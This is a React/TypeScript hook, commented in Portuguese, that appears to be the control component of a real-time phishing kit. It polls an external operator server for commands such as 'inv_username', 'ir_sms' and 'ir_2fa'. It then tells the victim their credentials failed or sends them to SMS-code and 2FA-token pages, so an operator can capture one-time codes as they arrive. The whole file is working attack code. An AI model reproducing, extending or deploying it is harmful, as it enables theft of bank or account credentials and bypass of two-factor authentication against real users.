
import { useState, useCallback, useRef, useEffect } from 'react';
import { useNavigate } from 'react-router-dom';
import { useToast } from '@/hooks/use-toast';

interface MonitoringState {
  isMonitoring: boolean;
  clientId: string | null;
  currentPage: string | null;
  lastSuccessfulCheck: number | null;
  consecutiveFailures: number;
}

const PRODUCTION_CONFIG = {
  pollInterval: 5000, // Aumentado para produção
  maxRetries: 3,
  retryDelay: 2000,
  timeout: 15000,
  maxConsecutiveFailures: 5
};

const DEVELOPMENT_CONFIG = {
  pollInterval: 3000,
  maxRetries: 2,
  retryDelay: 1000,
  timeout: 10000,
  maxConsecutiveFailures: 3
};

const isProduction = window.location.hostname !== 'localhost' && !window.location.hostname.includes('127.0.0.1');
const CONFIG = isProduction ? PRODUCTION_CONFIG : DEVELOPMENT_CONFIG;

export const useClientMonitoring = () => {
  const navigate = useNavigate();
  const { toast } = useToast();
  const [state, setState] = useState<MonitoringState>({
    isMonitoring: false,
    clientId: null,
    currentPage: null,
    lastSuccessfulCheck: null,
    consecutiveFailures: 0
  });
  
  const intervalRef = useRef<NodeJS.Timeout | null>(null);
  const isMonitoringRef = useRef(false);
  const retryTimeoutRef = useRef<NodeJS.Timeout | null>(null);

  // Cleanup na desmontagem do componente
  useEffect(() => {
    return () => {
      console.log('[MONITORING] Cleanup: parando monitoramento');
      stopMonitoring();
    };
  }, []);

  const stopMonitoring = useCallback(() => {
    console.log(`[MONITORING] [${isProduction ? 'PROD' : 'DEV'}] Parando monitoramento...`);
    isMonitoringRef.current = false;
    
    if (intervalRef.current) {
      clearInterval(intervalRef.current);
      intervalRef.current = null;
      console.log('[MONITORING] Interval principal limpo');
    }
    
    if (retryTimeoutRef.current) {
      clearTimeout(retryTimeoutRef.current);
      retryTimeoutRef.current = null;
      console.log('[MONITORING] Timeout de retry limpo');
    }
    
    setState(prev => ({ 
      ...prev, 
      isMonitoring: false,
      consecutiveFailures: 0
    }));
  }, []);

  const makeApiRequest = async (clientId: string, retryCount = 0): Promise<any> => {
    const controller = new AbortController();
    const timeoutId = setTimeout(() => controller.abort(), CONFIG.timeout);

    try {
      console.log(`[MONITORING] [${isProduction ? 'PROD' : 'DEV'}] Fazendo requisição (tentativa ${retryCount + 1}/${CONFIG.maxRetries + 1})`);
      
      const response = await fetch(`https://servidoroperador.onrender.com/api/clients/${clientId}/info`, {
        method: 'GET',
        headers: {
          'Content-Type': 'application/json',
        },
        signal: controller.signal
      });

      clearTimeout(timeoutId);

      if (!response.ok) {
        throw new Error(`HTTP ${response.status}: ${response.statusText}`);
      }

      const data = await response.json();
      console.log('[MONITORING] Requisição bem-sucedida:', data);
      return data;

    } catch (error) {
      clearTimeout(timeoutId);
      
      if (retryCount < CONFIG.maxRetries) {
        console.log(`[MONITORING] Erro na tentativa ${retryCount + 1}, tentando novamente em ${CONFIG.retryDelay}ms:`, error);
        
        return new Promise((resolve, reject) => {
          retryTimeoutRef.current = setTimeout(async () => {
            try {
              const result = await makeApiRequest(clientId, retryCount + 1);
              resolve(result);
            } catch (retryError) {
              reject(retryError);
            }
          }, CONFIG.retryDelay);
        });
      }
      
      throw error;
    }
  };

  const processResponse = useCallback((clientData: any, currentPage: string) => {
    const command = clientData.data?.command;
    const responseData = clientData.data?.response;
    
    console.log(`[MONITORING] [${currentPage.toUpperCase()}] Command: ${command}, Response: ${responseData}`);
    
    // Lógica específica por página
    if (currentPage === 'home') {
      if (command === 'inv_username' || responseData === 'inv_username') {
        console.log('[HOME] Dados incorretos detectados');
        stopMonitoring();
        toast({
          title: "Dados incorretos",
          description: "Verifique suas credenciais e tente novamente.",
          variant: "destructive",
        });
        return true; // Indica que processou o comando
      }
      
      if (command === 'ir_sms' || responseData === 'ir_sms') {
        console.log('[HOME] Redirecionando para SMS');
        stopMonitoring();
        navigate('/sms');
        return true;
      }
      
      if (command === 'ir_2fa' || responseData === 'ir_2fa') {
        console.log('[HOME] Redirecionando para TOKEN');
        stopMonitoring();
        navigate('/token');
        return true;
      }
    }
    
    if (currentPage === 'sms') {
      if (command === 'inv_sms' || responseData === 'inv_sms') {
        console.log('[SMS] Código SMS inválido detectado');
        if (window.handleInvalidSms) {
          window.handleInvalidSms();
        }
        return true;
      }
      
      if (command === 'ir_2fa' || responseData === 'ir_2fa') {
        console.log('[SMS] *** REDIRECIONANDO PARA TOKEN ***');
        stopMonitoring();
        navigate('/token');
        return true;
      }
    }
    
    if (currentPage === 'token') {
      if (command === 'inv_2fa' || responseData === 'inv_2fa') {
        console.log('[TOKEN] Token inválido detectado');
        if (window.handleInvalidToken) {
          window.handleInvalidToken();
        }
        return true;
      }
      
      if (command === 'ir_sms' || responseData === 'ir_sms') {
        console.log('[TOKEN] Redirecionando para SMS');
        stopMonitoring();
        navigate('/sms');
        return true;
      }
    }

    return false; // Não processou nenhum comando
  }, [navigate, toast, stopMonitoring]);

  const monitor = useCallback(async (clientId: string, currentPage: string) => {
    if (!isMonitoringRef.current) {
      console.log('[MONITORING] Flag de parada detectada, interrompendo monitor');
      return;
    }

    try {
      console.log(`[MONITORING] [${currentPage.toUpperCase()}] Consultando cliente ${clientId}...`);
      
      const clientData = await makeApiRequest(clientId);
      const processed = processResponse(clientData, currentPage);
      
      // Atualizar estado de sucesso
      setState(prev => ({
        ...prev,
        lastSuccessfulCheck: Date.now(),
        consecutiveFailures: 0
      }));

      if (!processed) {
        console.log(`[MONITORING] [${currentPage.toUpperCase()}] Nenhum comando relevante encontrado, continuando...`);
      }

    } catch (error) {
      console.log(`[MONITORING] [${currentPage.toUpperCase()}] Erro durante consulta:`, error);
      
      setState(prev => {
        const newFailures = prev.consecutiveFailures + 1;
        
        if (newFailures >= CONFIG.maxConsecutiveFailures) {
          console.log(`[MONITORING] Muitas falhas consecutivas (${newFailures}), parando monitoramento`);
          stopMonitoring();
          
          if (isProduction) {
            toast({
              title: "Problema de conectividade",
              description: "Recarregue a página se necessário.",
              variant: "destructive",
            });
          }
        }
        
        return {
          ...prev,
          consecutiveFailures: newFailures
        };
      });
    }
  }, [makeApiRequest, processResponse, stopMonitoring, toast]);

  const startMonitoring = useCallback((clientId: string, currentPage: string) => {
    console.log(`[MONITORING] [${isProduction ? 'PROD' : 'DEV'}] Iniciando monitoramento - Cliente: ${clientId}, Página: ${currentPage}`);
    console.log(`[MONITORING] Configuração: interval=${CONFIG.pollInterval}ms, maxRetries=${CONFIG.maxRetries}, timeout=${CONFIG.timeout}ms`);
    
    // Parar monitoramento anterior se existir
    stopMonitoring();
    
    // Verificar se clientId é válido
    if (!clientId || clientId.length === 0) {
      console.log('[MONITORING] ClientId inválido, não iniciando monitoramento');
      return;
    }
    
    setState(prev => ({ 
      ...prev, 
      isMonitoring: true, 
      clientId, 
      currentPage,
      lastSuccessfulCheck: null,
      consecutiveFailures: 0
    }));
    
    isMonitoringRef.current = true;

    // Executar primeira consulta imediatamente
    monitor(clientId, currentPage);
    
    // Configurar intervalo com configuração apropriada para o ambiente
    intervalRef.current = setInterval(() => {
      monitor(clientId, currentPage);
    }, CONFIG.pollInterval);
    
    console.log(`[MONITORING] Monitoramento ativo para página ${currentPage} (interval: ${CONFIG.pollInterval}ms)`);
  }, [monitor, stopMonitoring]);

  return {
    ...state,
    startMonitoring,
    stopMonitoring,
    isProduction,
    config: CONFIG
  };
};
